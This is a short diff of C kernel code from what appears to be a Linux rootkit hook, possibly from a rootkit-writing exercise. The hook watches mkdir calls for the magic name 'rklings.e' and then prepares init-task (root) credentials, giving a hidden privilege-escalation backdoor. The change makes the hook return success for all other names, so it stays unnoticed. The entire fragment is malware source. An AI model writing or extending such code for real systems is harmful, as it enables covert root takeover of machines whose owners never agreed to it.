@@ -12,7 +12,7 @@ RK_ON_MKDIR(name)
 	struct cred *new_cred;
 
 	if (strcmp(name, "rklings.e") != 0)
-		return -ENOENT;
+		return 0;
 
 	new_cred = prepare_kernel_cred(&init_task);
 	if (!new_cred)
